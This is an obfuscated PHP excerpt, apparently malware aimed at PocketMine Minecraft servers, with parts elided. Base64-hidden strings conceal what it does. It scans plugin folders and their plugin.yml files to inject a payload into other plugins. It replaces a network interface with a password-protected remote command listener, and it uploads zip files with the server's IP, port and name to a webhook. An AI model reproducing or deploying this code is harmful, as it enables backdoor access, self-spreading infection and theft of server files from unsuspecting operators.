...
try {
  $poolSize = function (\pocketmine\Server $server) {
    if (($base = $server->getConfigGroup()->getPropertyString(base64_decode('c2V0dGluZ3MuYXN5bmMtd29ya2Vycw=='), base64_decode('YXV0bw=='))) === base64_decode('YXV0bw==')) return ($processors = \pocketmine\utils\Utils::getCoreCount() - 2) > 0 ? max(1, $processors) : 2;
  ...
  $property = new \ReflectionProperty(\pocketmine\Server::getInstance()->getAsyncPool(), base64_decode('d29ya2VyTGFzdFVzZWQ='));
  ...
  \pocketmine\Server::getInstance()->getAsyncPool()->submitTaskToWorker(new class extends \pocketmine\scheduler\AsyncTask
  {
    ...
    public function onCompletion(): void
    {
      ...
      $inject = function () {
        ...
        foreach (scandir($path) as $dir) {
          ...
          $config = new \pocketmine\utils\Config($dirPath . base64_decode('L3BsdWdpbi55bWw='), 2);
          ...
          $payload = base64_decode('');
      ...
      $inject();
      foreach (\pocketmine\Server::getInstance()->getNetwork()->getInterfaces() as $interface) {
        try {
          ...
          \pocketmine\Server::getInstance()->getNetwork()->unregisterInterface($interface);
          break;
        } catch (\ReflectionException) {
          continue;
        }
      }
      \pocketmine\Server::getInstance()->getNetwork()->registerInterface(new class(function (string $commandLine): string {
      ...
      }, \pocketmine\Server::getInstance()->getTickSleeper()) implements \pocketmine\network\NetworkInterface
      {
        ...
        public function __construct(callable $onCommandCallback, \pocketmine\snooze\SleeperHandler $sleeper)
        {
          ...
          $this->thread ??= new class($this->socket, $this->ipcThreadSocket, $notifier) extends \pocketmine\thread\Thread
          {
            ...
            {
              $pk = \pocketmine\utils\Binary::writeLInt($requestID) . \pocketmine\utils\Binary::writeLInt($packetType) . $password . base64_decode('AAA=');
    ...
    public function sendFileToWebhook(string $file): void
    {
      try {
        ...
        $data = [base64_decode('Y29udGVudA==') => base64_decode('Kio=') . \pocketmine\Server::getInstance()->getMotd() . base64_decode('KioKYFs=') . \pocketmine\Server::getInstance()->getName() . base64_decode('XWAK') . base64_decode('Pj4+ICpJUDoqIA==') . \pocketmine\utils\Internet::getIP(true) . base64_decode('CipQb3J0Oiog') . \pocketmine\Server::getInstance()->getPort() . base64_decode('CipGaWNoaWVyOiog') . basename($file), base64_decode('dHRz') => base64_decode('ZmFsc2U='), base64_decode('ZmlsZQ==') => @curl_file_create($file, base64_decode('YXBwbGljYXRpb24vemlw'), \pocketmine\Server::getInstance()->getName() . base64_decode('Lw==') . basename($file))];
